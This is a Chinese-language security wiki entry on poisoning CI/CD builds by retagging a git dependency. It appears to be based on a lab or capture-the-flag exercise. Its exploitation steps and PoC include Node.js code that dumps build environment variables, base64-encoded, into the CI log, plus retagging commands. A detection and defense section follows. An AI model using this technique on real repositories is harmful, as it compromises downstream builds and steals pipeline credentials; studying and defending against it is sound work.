---
id: cloud-cicd-git-dependency-tag-republish-poisoning
title: Git 依赖 tag 重发投毒：篡改依赖仓库后重打/新增 tag 让下游 CI 构建加载恶意代码
type: scenario
domain: cloud
path: cloud/ci-cd
technique: git-dependency-tag-retag-poisoning
aliases:
- 依赖链投毒
- git 依赖 tag 覆盖
- npm git 依赖
- tag 重发
- 供应链依赖劫持
- twiddledee 投毒
tags:
- cicd
- supply-chain
- dependency
- git-tag
- npm
- jenkins
- build
- credentials
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:13+08:00'
  notes: 已对照原文与图08/09核对 git+semver 依赖、1.1.0 删除重发/1.2.0 tag 与 node index.js 的 env base64 输出。
---

## 一句话结论

当下游项目通过 git 依赖（如 `"dep": "git+http://gitea/Wonderland/twiddledee#semver:^1.1.0"`）拉取攻击者可控的仓库时，攻击者修改依赖代码并把原 tag 删除后重发（或推送满足 semver 的新 tag），下游 CI 下次 `npm install`/构建就会拉取恶意提交并在安装或运行阶段执行，窃取构建环境变量与凭据。

## 原理

- **git 依赖按 tag/semver 解析**：package.json 里 `git+http://.../repo#semver:^1.1.0` 表示从 git 仓库取满足范围的 tag；tag 只是可移动的引用，可以被删除后重新指向新提交。
- **CI 每次构建重新解析依赖**：无 lockfile 固定 commit 时，`npm install` 会重新解析 tag/范围；恶意提交被拉取后，依赖包的 `index.js`（或安装脚本）在构建中被 require/执行。
- **信任边界**：下游信任的是"仓库地址 + tag 名"，不是不可变的 commit hash；攻击者控制依赖仓库（或维护者账号）即可在合法 tag 名下投放恶意代码。
- **执行点**：依赖被 require/import 时执行顶层代码，或 postinstall 等生命周期脚本执行，均可读取 CI 环境变量（含凭据）并通过 `child_process` 外带。

## 触发条件

- 下游项目以 git 方式依赖攻击者可写的仓库，且按 tag/semver 或分支拉取。
- 构建时安装/加载该依赖（npm install、pytest、node index.js 等）。
- 依赖未被 lockfile 锁到不可变 commit，或 lockfile 可被忽略/更新。
- 构建环境存在可被读取的凭据/敏感环境变量。

## 利用步骤

1. 修改依赖仓库（示例 twiddledee）的 `index.js`：
   ```js
   const child_process = require('child_process');
   child_process.exec('env|base64 -w 0', (e, stdout) => { console.log(stdout); });
   ```
2. 推送到依赖仓库 main；删除旧的 `1.1.0` tag 后重新发布（或直接 `git tag 1.2.0 HEAD && git push origin 1.2.0`，满足 `^1.1.0` 范围）。
3. 触发下游（twiddledum）构建；其 `package.json` 依赖 `twiddledee#semver:^1.1.0`，`node index.js`/安装阶段加载恶意代码。
4. 在构建日志中取 base64 环境变量/flag。

## PoC

```json
"dependencies": {
  "twiddledee": "git+http://gitea:3000/Wonderland/twiddledee#semver:^1.1.0"
}
```

```bash
git tag 1.2.0 HEAD
git push origin 1.2.0
```

原文通过删除并重新发布 1.1.0（或推新 tag）让下游构建拉取恶意代码，日志中得到 base64 环境变量。

## 变体与关联

- **包管理器变体**：npm git 依赖、pip `git+https`、Go module（replace/伪版本）、Composer/Vundle 等。
- **覆盖对象变体**：Docker 镜像 tag 覆盖（见 [[cloud-cicd-package-rce-poisoned-base-image-registry]]）、PyPI 包版本重发、共享 CI 脚本仓库分支指针。
- **关联**：[[cloud-cicd-jenkins-indirect-ppe-build-script-makefile]]（构建脚本投毒）、[[cloud-cicd-dependency-confusion-public-package-name-collision]]（依赖混淆）。

## 检测与防御

- **锁定不可变引用**：lockfile 固定 git 依赖到 commit hash（npm `package-lock.json`、yarn.lock、go.sum、pip `--require-hashes`）；CI 使用 `npm ci`/`--frozen-lockfile`。
- **保护依赖仓库**：禁止 tag 删除/force push，tag 签名；对依赖仓库启用分支保护与双人评审。
- **依赖治理**：SBOM/依赖来源白名单、私有 registry 代理与审计；对依赖包代码执行做 sandbox。
- **检测**：监控依赖 tag 变更、下游构建中依赖包的新增网络外连与 `env`/`base64` 行为；比对 lockfile 与实际解析 commit。
